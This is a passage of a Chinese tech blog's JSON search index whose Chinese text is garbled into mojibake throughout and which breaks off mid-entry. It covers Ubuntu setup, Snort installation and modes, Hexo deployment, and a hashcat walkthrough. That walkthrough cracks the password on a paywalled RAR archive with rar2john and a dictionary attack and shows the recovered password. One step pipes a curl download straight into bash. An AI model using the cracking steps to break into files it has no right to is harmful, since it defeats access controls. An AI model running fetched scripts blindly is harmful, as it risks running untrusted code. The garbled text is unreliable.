è½½é…ç½®æ–‡ä»¶ 1source ~/.zshrc å­—ä½“ä¹±ç é—®é¢˜ ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ç¬¦å·å­—ä½“å’Œå­—ä½“é…ç½®æ–‡ä»¶ 123wget https://github.com/powerline/powerline/raw/develop/font/PowerlineSymbols.otfwget https://github.com/powerline/powerline/raw/develop/font/10-powerline-symbols.conf å°†ç¬¦å·å­—ä½“ç§»åŠ¨åˆ°ä¸€ä¸ªå¯ç”¨çš„å­—ä½“è·¯å¾„ 1mv PowerlineSymbols.otf ~/.local/share/fonts/ æ›´æ–°å­—ä½“ç§»åŠ¨åˆ°è·¯å¾„çš„å­—ä½“ç¼“å­˜ 1fc-cache -vf ~/.local/share/fonts/ å®‰è£…å­—ä½“é…ç½®æ–‡ä»¶ 1mv 10-powerline-symbols.conf ~/.config/fontconfig/conf.d/ é‡å¯ 1reboot ä¸‹è½½æ’ä»¶ è‡ªåŠ¨æç¤º 1git clone https://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions è¯­æ³•é«˜äº® 1sudo apt install zsh-syntax-highlighting 1echo &quot;source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh&quot; &gt;&gt; ~/.zshrc ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œç”Ÿæ•ˆæ’ä»¶ 1vim ~/.zshrc æ‰¾åˆ°æ’ä»¶ä½ç½®ï¼Œæ·»åŠ åˆšåˆšçš„æ’ä»¶ 1source ~/.zshrc PSï¼šå¦‚æœé‡æ–°æ‰“å¼€ç»ˆç«¯çœ‹ä¸åˆ°è‡ªåŠ¨æç¤ºï¼Œå¯èƒ½æ˜¯ç»ˆç«¯çš„å­—ä½“é¢œè‰²å¤ªæ·¡äº†ï¼Œå¯ä»¥é€šè¿‡ğŸ‘‡é…ç½®æŠŠå­—ä½“æ”¹äº®ä¸€äº›ï¼š 1cd ~/.oh-my-zsh/custom/plugins/zsh-autosuggestions ä¿®æ”¹è‡ªåŠ¨æç¤ºç›¸å…³çš„é…ç½®æ–‡ä»¶ï¼šZSH_AUTOSUGGEST_HIGHLIGHT_STYLE=&#39;fg=10&#39; 12vi zsh-autosuggestions.zshsource ~/.zshrc *Ubuntu å¿«é€Ÿå¼€å¯ TCP BBR å®ç°é«˜æ•ˆå•è¾¹åŠ é€Ÿã€éå¿…éœ€ã€‘Linux Kernel å†…æ ¸å‡çº§åˆ° 4.9 åŠä»¥ä¸Šç‰ˆæœ¬å¯ä»¥å®ç° BBR åŠ é€Ÿï¼Œç”±äºUbuntu 18.04 é»˜è®¤çš„å†…æ ¸å°±æ˜¯ 4.15ç‰ˆæœ¬çš„å†…æ ¸ã€‚ ç”±äºUbuntu 20.04 é»˜è®¤çš„å†…æ ¸å°±æ˜¯ 5.4 ç‰ˆæœ¬çš„å†…æ ¸ï¼Œå¹¶å·²ç»é»˜è®¤ç¼–è¯‘äº† TCP BBR æ¨¡å—ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡å‚æ•°å¼€å¯ã€‚æ–°çš„ TCP æ‹¥å¡æ§åˆ¶ç®—æ³• BBR (Bottleneck Bandwidth and RTT) å¯ä»¥è®©æœåŠ¡å™¨çš„å¸¦å®½å°½é‡è·‘æ…¢ã€‚å¹¶ä¸”å°½é‡ä¸è¦æœ‰æ’é˜Ÿçš„æƒ…å†µï¼Œè®©ç½‘ç»œæœåŠ¡æ›´ä½³ç¨³å®šå’Œé«˜æ•ˆã€‚ ä¿®æ”¹ç³»ç»Ÿå˜é‡ï¼š 12echo net.core.default_qdisc=fq &gt;&gt; /etc/sysctl.confecho net.ipv4.tcp_congestion_control=bbr &gt;&gt; /etc/sysctl.conf ä¿å­˜ç”Ÿæ•ˆ 1sysctl -p æ‰§è¡Œ 1sysctl net.ipv4.tcp_available_congestion_control å¦‚æœç»“æœæ˜¯è¿™æ · 12sysctl net.ipv4.tcp_available_congestion_controlnet.ipv4.tcp_available_congestion_control = bbr cubic reno å°±å¼€å¯äº†ã€‚æ‰§è¡Œ lsmod | grep bbr ï¼Œä»¥æ£€æµ‹ BBR æ˜¯å¦å¼€å¯ã€‚ å®‰è£…python12345sudo apt-get updatesudo add-apt-repository ppa:deadsnakes/ppasudo apt-get install python3.8# æŸ¥çœ‹ç‰ˆæœ¬ python3.8 --version å®‰è£…pip 1sudo apt install python3-pip ä¿®æ”¹ç³»ç»Ÿé»˜è®¤ç‰ˆæœ¬ä¸ºpython3.8 åˆ é™¤é»˜è®¤çš„Python3è½¯é“¾æ¥ï¼š 1sudo rm /usr/bin/python3 ç„¶ååˆ›å»ºä¸€ä¸ªæ–°çš„è½¯é“¾æ¥æŒ‡å‘éœ€è¦çš„Python3ç‰ˆæœ¬ï¼š 1sudo ln -s /usr/bin/python3.8 /usr/bin/python3","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"ubuntu","slug":"ubuntu","permalink":"https://gryffinbit.top/tags/ubuntu/"}],"author":"Gryffinbit"},{"title":"ubuntuã€ARMæ¶æ„ã€‘ä¸‹å®‰è£…snortã€è™šæ‹Ÿæœºç‰ˆã€‘","slug":"ubuntuä¸‹æ­å»ºsnortã€è™šæ‹Ÿæœºç‰ˆã€‘","date":"2022-07-06T22:07:42.000Z","updated":"2024-11-12T06:59:08.000Z","comments":true,"path":"2022/07/07/ubuntuä¸‹æ­å»ºsnortã€è™šæ‹Ÿæœºç‰ˆã€‘/","permalink":"https://gryffinbit.top/2022/07/07/ubuntu%E4%B8%8B%E6%90%AD%E5%BB%BAsnort%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E3%80%91/","excerpt":"","text":"Tipsubuntuç³»ç»Ÿé…ç½®ç›¸å…³Blog: æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½® ç¯å¢ƒé…ç½®Ubuntu: Ubuntu 20.04.2 ARM64 ã€parallelè™šæ‹Ÿæœºã€‘ macOS: macOS Monterey. M1, 2020, ARM64ã€ç‰©ç†æœºã€‘ ubuntuæ“ä½œç”¨æˆ·ï¼šåœ¨parallelsæ™®é€šç”¨æˆ·ä¸‹è¿›è¡Œsnortéƒ¨ç½² snortç‰ˆæœ¬ï¼šsnort-2.9.20 ubuntuæºï¼šä¸­ç§‘å¤§armæº ä¸­ç§‘å¤§æº 1sudo vim /etc/apt/sources.list 123456789101112131415deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security multiverse æ›´æ–°ç³»ç»Ÿè½¯ä»¶æº 1sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y æ›´æ­£æ—¶é—´ 1sudo dpkg-reconfigure tzdata å‰è¨€ snorté‡Œé¢æœ‰å¾ˆå…¨çš„æ–‡æ¡£ï¼ŒåŒ…æ‹¬snortçš„å®‰è£…ã€ä½¿ç”¨ã€æ’ä»¶ã€å—…æ¢æ¨¡å¼å¦‚ä½•ä½¿ç”¨ç­‰ snort-2.9.20 æ–°å»ºä¸€ä¸ªsnortæ–‡ä»¶å¤¹ï¼Œç”¨äºå­˜æ”¾snortç›¸å…³æ–‡æ¡£ã€‚è·¯å¾„/home/parallels/snortFileï¼Œ å°†snortæ–‡ä»¶å¤¹ç§»è‡³è¯¥è·¯å¾„ä¸‹ å®‰è£…ç›¸å…³ä¾èµ–Tips:å®‰è£…ä¼šå‡ºç°ç‰ˆæœ¬ä¾èµ–æŠ¥é”™ã€‚ç”¨aptitudeè¿›è¡Œå®‰è£…ï¼Œä¼šæ¨èå®‰è£…æ–¹æ¡ˆï¼Œä¸ä¼šåœ¨åˆ é™¤åŒ…çš„åŒæ—¶é€ æˆé‡å¤§å½±å“ å®‰è£…aptitude éœ€è¦å…ˆåœ¨ubuntué‡Œé¢ä¿®æ”¹é…ç½®ï¼Œæ‰èƒ½é¡ºåˆ©å®‰è£…ï¼Œæ‰¾åˆ°software&amp;updateï¼Œå‹¾é€‰ 123sudo apt-get updatesudo apt-get install build-essentialsudo apt-get install aptitude 12sudo aptitude install libpcap-devsudo apt-get install libpcap0.8-dev 123sudo apt-get install libdnet-devsudo apt-get install libdumbnet-devsudo apt-get install libdnet 123sudo apt-get install libpcre++0v5sudo apt-get install libpcre3-devsudo apt-get install libpcre++-dev 12sudo apt-get install flexsudo apt-get install bison 1234sudo apt-get install libluajit-5.1-dev sudo apt-get install automakesudo apt-get install libnghttp2-devsudo apt-get install libtool å®‰è£…daqæ•°æ®é‡‡é›†åº“ daq-2.0.7 å°†åœ¨å®˜ç½‘ä¸‹è½½çš„daqæ–‡ä»¶å¤¹æ”¾å…¥snortFile 123456 cd snortFile/daq-2.0.7 aclocal automake --add-missing./configuresudo makesudo make install 1export PATH=$PATH:/usr/local/bin æ£€æŸ¥æ‰€éœ€ä¾èµ–æ˜¯å¦éƒ½å®‰è£…æˆåŠŸ 123which dnet-configwhich pcre-configwhich daq-modules-config å®‰è£…snortè¿›å…¥åˆ°snortå®‰è£…åŒ…è·¯å¾„ 1cd snortFile/snort-2.9.20 ç¼–è¯‘ 123sudo apt upgradesudo apt install libssl1.1=1.1.1f-1ubuntu2sudo aptitude install libssl-dev 123./configure --enable-sourcefiresudo makesudo make install ç¼–è¯‘æˆåŠŸ snortå®‰è£…æˆåŠŸ 1sudo snort -v snorté…ç½®ç›¸å…³snorté…ç½®ç›¸å…³blogè§ä¸‹ç¯‡ï¼š é…ç½®snortä»¥NIDSæ¨¡å¼è¿è¡Œã€ubuntu ARM64ç³»ç»Ÿã€‘ å‚è€ƒæ–‡ç« ubuntu armç‰ˆæœ¬çš„snortå…¬å‘Š libdpcapå®˜æ–¹åŒ…è§£é‡Šæ–‡æ¡£ pkgs.org snort&#x2F;daqå®‰è£…é…ç½® daqarm64ç‰ˆæœ¬","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"},{"name":"ARMæ¶æ„","slug":"ARMæ¶æ„","permalink":"https://gryffinbit.top/tags/ARM%E6%9E%B6%E6%9E%84/"},{"name":"parallelsè™šæ‹Ÿæœº","slug":"parallelsè™šæ‹Ÿæœº","permalink":"https://gryffinbit.top/tags/parallels%E8%99%9A%E6%8B%9F%E6%9C%BA/"}],"author":"Gryffinbit"},{"title":"hexoå®‰è£…éƒ¨ç½²ï¼ˆå¾…å®Œå–„ç‰ˆæœ¬ï¼‰","slug":"hexoå®‰è£…éƒ¨ç½²ï¼ˆå¾…å®Œå–„ç‰ˆæœ¬ï¼‰","date":"2022-07-05T00:06:47.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/07/05/hexoå®‰è£…éƒ¨ç½²ï¼ˆå¾…å®Œå–„ç‰ˆæœ¬ï¼‰/","permalink":"https://gryffinbit.top/2022/07/05/hexo%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%EF%BC%88%E5%BE%85%E5%AE%8C%E5%96%84%E7%89%88%E6%9C%AC%EF%BC%89/","excerpt":"","text":"å‰æœŸå‡†å¤‡å®‰è£…npmmac ä¸‹ 1brew install npm Tip : Mac å®‰è£…brew 1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; å¦‚æœå‡ºç°443æ‹’ç»è¿æ¥é—®é¢˜ï¼Œæ‰‹åŠ¨ä¸‹è½½install.shåˆ°æœ¬åœ°ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œã€‚ç›´æ¥å°†shè„šæœ¬æ‹–è¿›ç»ˆç«¯ã€‚ æ‰‹åŠ¨ä¸‹è½½ï¼šhttps://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh éƒ¨ç½²hexoä¸‹è½½å®‰è£…å®šä½åˆ°è‡ªå·±çš„Blogçš„è·¯å¾„ã€‚ æ³¨ï¼šBlogæ˜¯æˆ‘è‡ªå·±çš„å‘½åï¼Œå…¨æ–‡å®‰è£…æ—¶ï¼Œæ›´æ”¹æˆè‡ªå·±çš„blogåå­—åŠè·¯å¾„ 1cd Blog 1npm install -g hexo-cli åˆå§‹åŒ–1hexo init Blog ![Screen Shot 2021-04-22 at 3.17.45 PM](&#x2F;Users&#x2F;gryffinbit&#x2F;Desktop&#x2F;Screen Shot 2021-04-22 at 3.17.45 PM.png)åˆå§‹åŒ–å®Œæˆå 1npm install æ‰§è¡Œå®Œæˆåä¼šç”Ÿæˆä¸€äº›é…ç½®æ–‡ä»¶ 1config.yml //ç½‘ç«™çš„é…ç½®ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤é…ç½®å¤§éƒ¨åˆ†çš„å‚æ•°ã€‚ 12package.json _drafts _posts 1source //èµ„æºæ–‡ä»¶å¤¹æ˜¯å­˜æ”¾ç”¨æˆ·èµ„æºçš„åœ°æ–¹ã€‚ 1scaffolds //æ¨¡ç‰ˆæ–‡ä»¶å¤¹ã€‚å½“æ–°å»ºæ–‡ç« æ—¶ï¼ŒHexo ä¼šæ ¹æ® scaffold æ¥å»ºç«‹æ–‡ä»¶ã€‚ 1themes //ä¸»é¢˜æ–‡ä»¶å¤¹ã€‚Hexoä¼šæ ¹æ®ä¸»é¢˜æ¥ç”Ÿæˆé™æ€é¡µé¢ å¼€å§‹å»ºç«‹blogæ–°å»ºä¸€ç¯‡æ–‡ç« ï¼ˆæˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« ï¼‰ 1hexo new &quot;æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« &quot; ä¼šåœ¨&#x2F;source&#x2F;_posté‡Œè‡ªåŠ¨ç”Ÿæˆäº†â€œæˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« .mdâ€æ–‡ä»¶ï¼Œä¹‹åæ–°å»ºçš„æ–‡ç« éƒ½å°†å­˜æ”¾åœ¨æ­¤ç›®å½•ä¸‹ã€‚ç¼–è¾‘â€œæˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« .mdâ€æ–‡ä»¶å¯ä¿®æ”¹å†…å®¹ã€‚ ç”Ÿæˆç½‘ç«™ 1hexo generate (å¯ç®€å†™æˆ hexo g) å¯åŠ¨æœ¬åœ°æœåŠ¡å™¨ å¯ä»¥ç”¨äºåœ¨æœ¬åœ°ä¸Šè¿›è¡ŒæŸ¥çœ‹ã€ä¿®æ”¹ï¼Œæœ€åå†éƒ¨ç½²ä¸Šå» 1hexo server (å¯ç®€å†™æˆ hexo s) åœ¨æµè§ˆå™¨è¾“å…¥http://localhost:4000 å³å¯æŸ¥çœ‹ç½‘ç«™ã€‚ éƒ¨ç½²åˆ°GitHubå°†blogéƒ¨ç½²åˆ°Github Pages ä¸Šï¼Œä½¿ç”¨hexo deployéƒ¨ç½² hexo deployéƒ¨ç½²æ‰¾åˆ°blogç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶_config.yml,ç”¨ç¼–è¾‘å™¨æ‰“å¼€æ­¤æ–‡ä»¶ æ‰¾åˆ°æ­¤æ–‡ä»¶ä¸­çš„deployå­—æ®µï¼ŒæŒ‰ç…§ä»¥ä¸‹é…ç½® 12345deploy: type: git repository: https://github.com/Gryffinbit/gryffinbit.github.io //è‡ªå·±çš„githubé¡¹ç›®é“¾æ¥ branch: master å®‰è£…æ‰©å±• 12npm install hexo-deployer-git --save 123. è®¾ç½®ç”¨æˆ·å git config --global user.email &quot;you@example.com&quot; git config --global user.name &quot;Your Name&quot; 12345 4. éƒ¨ç½²hexo deploy","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://gryffinbit.top/tags/hexo/"}],"author":"Gryffinbit"},{"title":"hashcatçˆ†ç ´rar","slug":"hashcatçˆ†ç ´rar","date":"2022-07-02T18:09:41.000Z","updated":"2024-11-12T06:59:41.000Z","comments":true,"path":"2022/07/03/hashcatçˆ†ç ´rar/","permalink":"https://gryffinbit.top/2022/07/03/hashcat%E7%88%86%E7%A0%B4rar/","excerpt":"","text":"ä»Šå¤©ä¸‹è½½ç¾å‰§ï¼Œä¸‹è½½äº†å‹ç¼©åŒ…ä¹‹åï¼Œå‘ç°ç«Ÿç„¶åŠ å¯†äº†ï¼Œè¦æ‰«äºŒç»´ç æ”¶è´¹æ‰å¯ä»¥è§£é”ã€‚soï¼Œé‚£ä¸èƒ½æƒ¯ç€ä»–ï¼Œäºæ˜¯ä¸Šäº†hashcatè¿›è¡Œå‹ç¼©åŒ…çš„çˆ†ç ´ å®éªŒç¯å¢ƒå‹ç¼©åŒ…æ ¼å¼ä¸º rar ç”µè„‘ç³»ç»Ÿä¸ºï¼šmacOS Montereyã€‚M1ï¼Œ2020 hashcathttps://hashcat.net/hashcat/ Worldâ€™s fastest password cracker Worldâ€™s first and only in-kernel rule engine æ€»ä¹‹hashcatæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„çˆ†ç ´å·¥å…· åœ¨å®˜ç½‘ä¸ŠæŠŠèµ„æºåŒ…ä¸‹è½½ï¼Œç¼–è¯‘è¿è¡Œ 1make æŠŠhashcatåŠ å…¥åˆ°è·¯å¾„ 1vim ~/.zshrc 1export PATH=&quot;&lt;path&gt;:$PATH&quot; Pathä¸­å¡«å…¥hashcatè¿™ä¸ªæ–‡ä»¶å¤¹æ‰€åœ¨è·¯å¾„ã€‚è¿™æ ·ä¸‹æ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œå°±ä¸éœ€è¦æŠŠhashcatçš„è¿è¡Œæ–‡ä»¶è·¯å¾„å¡«å…¥ï¼Œåªéœ€è¦è¾“å…¥hashcatå°±å¯ä»¥ç”¨äº†ã€‚ 1source ~/.zshrc ä½¿æ–‡ä»¶ç”Ÿæ•ˆ john-jumboçˆ†ç ´ä¹‹å‰ï¼Œéœ€è¦å…ˆè·å–rarå¯†ç çš„hashï¼Œéœ€è¦ç”¨åˆ°å·¥å…·john-humbo 1brew install john-jumbo åŒç†ï¼Œå°†johnåŠ å…¥åˆ°è·¯å¾„ã€‚ 1vim ~/.zshrc 1export PATH=&quot;/opt/homebrew/Cellar/john-jumbo/1.9.0/share/john:$PATH&quot; 1source ~/.zshrc åœ¨shellä¸­è¾“å…¥ 1rar2john &lt;raræ–‡ä»¶è·¯å¾„&gt; å°†hashä¿å­˜ä¸ºæ–‡ä»¶test.hash çˆ†ç ´1hashcat -m 13000 -a 0 test.hash example.dict -D2 -må‚æ•°æ˜¯æ ¹æ®rarç±»å‹è¿›è¡Œé€‰æ‹©çš„ï¼Œè¿™é‡Œæ˜¯RAR5 -aå‚æ•°æ˜¯æ”»å‡»æ¨¡å¼ï¼Œâ€œ-a 0â€å­—å…¸æ”»å‡»ï¼Œâ€œ-a 1â€ ç»„åˆæ”»å‡»ï¼›â€œ-a 3â€æ©ç æ”»å‡»ã€‚ test.hashæ˜¯ä¿å­˜çš„hashå€¼ example.dict æ˜¯hashcatè‡ªå¸¦çš„å­—å…¸ è¿™é‡Œçš„-D2æ˜¯å› ä¸ºæ­£å¸¸è¿è¡Œçš„æ—¶å€™ï¼Œåœ¨m1èŠ¯ç‰‡ä¸Šä¼šæŠ¥é”™ï¼Œæ˜¾ç¤ºæ²¡æœ‰è®¾å¤‡å¯ç”¨ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å¼ºåˆ¶æŒ‡å®šè®¾å¤‡ é€‰æ‹©è®¾å¤‡å æœ€ç»ˆæ˜¾ç¤ºå¯†ç çš„æ—¶å€™ï¼Œä½¿ç”¨â€“showå‚æ•°ï¼Œå°†æœ€ç»ˆå¯†ç å±•ç¤º 1hashcat -m 13000 -a 0 test.hash example.dict -D2 --show çˆ†ç ´æˆåŠŸï¼Œå¯†ç aaa123456. ä¸‹æ¬¡å»ºè®®æƒ³éª—é’±çš„è¯ï¼Œå°±åˆ«ç”¨å¼±å¯†ç äº†[æ‰‹åŠ¨ç‹—å¤´] ç•ªå¤–å®é™…ä¸Šï¼Œæˆ‘ç”¨m1çš„æ—¶å€™ï¼Œå¼€å§‹æŠ¥é”™å¾ˆå¤šï¼Œæˆ‘å»hashcatçš„pullrequest é‡Œé¢ç¿»ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå¤§ä½¬ä¸“é—¨ä¸ºm1èŠ¯ç‰‡çš„å„ä¸ªé—®é¢˜ï¼Œå†™äº†æ–°çš„ç‰ˆæœ¬ï¼Œæ²¡æœ‰æˆä¸ºæ­£å¼å‘å¸ƒçš„ç‰ˆæœ¬ï¼Œä½†æ˜¯éå¸¸å¥½ç”¨ï¼Œæˆ‘æœ€åçˆ†ç ´æˆåŠŸç”¨çš„å°±æ˜¯ä»–å†™çš„ç‰ˆæœ¬ã€‚ è¿™æ˜¯issueçš„é“¾æ¥ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±ç¿»ç¿»çœ‹ï¼Œæ‰¾åˆ°è‡ªå·±å¯¹åº”çš„é—®é¢˜. M1 No device found&#x2F;left å¤§ä½¬ç»™å‡ºçš„m1æœ€ç»ˆä¿®è®¢ç‰ˆ. apple_m1_final å®é™…ä¸Šæˆ‘è‡ªå·±åœ¨ç”¨çš„ç‰ˆæœ¬ apple_m07500_native_threads è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„branches","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"hashcat","slug":"hashcat","permalink":"https://gryffinbit.top/tags/hashcat/"}],"author":"Gryffinbit"},{"title":"snortçš„å·¥ä½œæ¨¡å¼","slug":"snortçš„å·¥ä½œæ¨¡å¼","date":"2022-06-27T16:43:33.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/06/28/snortçš„å·¥ä½œæ¨¡å¼/","permalink":"https://gryffinbit.top/2022/06/28/snort%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"å·¥ä½œæ¨¡å¼ snortæœ‰ä¸‰ç§å·¥ä½œæ¨¡å¼ï¼šå—…æ¢å™¨æ¨¡å¼ã€æ•°æ®åŒ…è®°å½•å™¨æ¨¡å¼ã€ ç½‘ç»œå…¥ä¾µæ£€æµ‹æ¨¡å¼ å—…æ¢å™¨æ¨¡å¼ sniffer modeä»ç½‘ç»œä¸­æŠ“å–æ•°æ®åŒ… æ•°æ®åŒ…å—…æ¢å™¨æœ‰ä»¥ä¸‹å‡ ç§ç”¨é€”ï¼š ç½‘ç»œåˆ†æå’Œç½‘ç»œæ•…éšœæŸ¥æ‰¾ ç½‘ç»œæ€§èƒ½å’Œè´Ÿè·é‡åˆ†æ ç›‘å¬æ˜æ–‡ä¼ è¾“çš„ç”¨æˆ·åå¯†ç ç­‰æ•æ„Ÿæ•°æ® æ•°æ®åŒ…è®°å½•å™¨æ¨¡å¼ packet logger modeå°†æ•°æ®åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸­ å—…æ¢å™¨æ¨¡å¼å¾—åˆ°çš„è¾“å‡ºä¿¡æ¯éƒ½æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå¦‚æœè¦æŠŠè¿™äº›æ•°æ®ä¿¡æ¯è®°å½•åˆ°ç¡¬ç›˜ä¸Šå¹¶åˆ¶å®šåˆ°ä¸€ä¸ªç›®å½•ä¸­ï¼Œå°±éœ€è¦æ•°æ®åŒ…è®°å½•å™¨ã€‚ å¯ä»¥æŠ“åˆ°æ•°æ®é“¾è·¯å±‚ã€TCP&#x2F;IPæŠ¥å¤´ã€åº”ç”¨å±‚çš„æ•°æ®ã€‚ æ–‡ä»¶ä¿å­˜æ ¼å¼æ˜¯äºŒè¿›åˆ¶ä¿å­˜ã€‚ ç½‘ç»œå…¥ä¾µæ£€æµ‹æ¨¡å¼ network intrusion detection system modeåˆ†æç½‘ç»œä¸­ä¼ è¾“çš„æ•°æ®å¹¶ä¸å…¥ä¾µè§„åˆ™åº“ç›¸åŒ¹é…æ¥å‘ç°å…¥ä¾µè¡Œä¸ºã€‚ å¦‚æœå°†snortç”¨ä½œé•¿æœŸæ£€æµ‹ï¼Œé‚£ä¹ˆæ—¥å¿—ä¼šè¶Šæ¥è¶Šå¤šï¼Œå ç”¨ç©ºé—´è¶Šæ¥è¶Šå¤§ã€‚æ‰€ä»¥å¯ä»¥è®¾ç½®IDSæ¨¡å¼ï¼Œå°†ç½‘ç»œæŠ¥è­¦ä¿¡æ¯è®°å½•åˆ°log æŠ¥è­¦æ¨¡å¼ å½“æ•è·çš„åŒ…ä¸è§„åˆ™åŒ¹é…ï¼Œsnortå¯ä»¥ä»¥å¤šç§æ¨¡å¼æŠ¥è­¦ã€‚å½“æ»¡è¶³äº†ä¸€æ¡æŠ¥è­¦æ¡ä»¶æ—¶ï¼Œsnortä¸­çš„æŠ¥è­¦å°†åšä¸¤ä»¶äº‹ï¼š å‘æŠ¥è­¦å·¥å…·è¾“å‡ºä¸€ä¸ªäº‹ä»¶ ä»¥é…ç½®å¥½çš„æ—¥å¿—æ¨¡å¼è®°å½•å°½å¯èƒ½å¤šçš„æˆ–éœ€è¦çš„ä¿¡æ¯ æŠ¥è­¦æœºåˆ¶ fastï¼šæœ€å¸¸ç”¨çš„æ¨¡å¼ï¼ŒæŠ¥è­¦ä¿¡æ¯åŒ…æ‹¬ä¸€ä¸ªæ—¶é—´æˆ³ã€æŠ¥è­¦æ¶ˆæ¯ã€æº&#x2F;ç›®çš„IPåœ°å€å’Œç«¯å£ã€åœ¨å¤§è§„æ¨¡é«˜é€Ÿç½‘ç»œä¸­æœ€å¥½ä½¿ç”¨fastæ¨¡å¼ã€‘ fullï¼šé»˜è®¤çš„æŠ¥è­¦æ¨¡å¼ã€é€‚ç”¨äºä½å¸¦å®½ç½‘ç»œã€‘ unsockï¼šæŠŠæŠ¥è­¦é€šè¿‡unixå¥—æ¥å­—å‘é€åˆ°ä¸€ä¸ªç›‘å¬ç¨‹åºï¼Œè¿™æ ·å¯ä»¥å®ç°å®æ—¶æŠ¥è­¦ noneï¼šå°†snortæŠ¥è­¦å®Œå…¨å…³é—­ã€åœ¨é«˜é€Ÿç½‘ç»œç¯å¢ƒåº”ç”¨ç»Ÿä¸€æ—¥å¿—çš„æƒ…å†µä¸‹å¾ˆæœ‰ç”¨ï¼Œå¯ä»¥åœ¨ç»Ÿä¸€æ—¥å¿—çš„æ—¶å€™å…³é—­æ™®é€šæ—¥å¿—é€‰é¡¹ã€‘ syslogï¼šä½¿snortæŠŠæŠ¥è­¦æ¶ˆæ¯å‘é€åˆ°syslogã€‚å¯ä»¥é€šè¿‡snort.confæ–‡ä»¶ä¿®æ”¹å…¶é…ç½®ã€æ˜¯äº§ç”Ÿç³»ç»Ÿäº‹ä»¶æ—¥å¿—çš„å®ˆæŠ¤è¿›ç¨‹ã€‘","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"snort","slug":"å…¥ä¾µæ£€æµ‹/snort","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/"}],"tags":[{"name":"snort","slug":"snort","permalink":"https://gryffinbit.top/tags/snort/"}],"author":"Gryffinbit"},{"title":"snortå®šä¹‰å’Œä½¿ç”¨å˜é‡","slug":"snorté…ç½®æ–‡ä»¶ï¼ˆå®šä¹‰ã€ä½¿ç”¨å˜é‡ï¼‰","date":"2022-06-26T18:52:43.000Z","updated":"2024-11-12T06:59:19.000Z","comments":true,"path":"2022/06/27/snorté…ç½®æ–‡ä»¶ï¼ˆå®šä¹‰ã€ä½¿ç”¨å˜é‡ï¼‰/","permalink":"https://gryffinbit.top/2022/06/27/snort%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%88%E5%AE%9A%E4%B9%89%E3%80%81%E4%BD%BF%E7%94%A8%E5%8F%98%E9%87%8F%EF%BC%89/","excerpt":"","text":"snortå®šä¹‰å’Œä½¿ç”¨å˜é‡å®šä¹‰æ™®é€šå˜é‡ï¼š 1var &lt;å˜é‡å&gt;&lt;å˜é‡å€¼&gt; ä¾‹å¦‚ 1var HOME_NET 192.168.1.0/24 å¼•ç”¨å˜é‡æ—¶ï¼Œåœ¨è§„åˆ™ä¸­ç”¨ 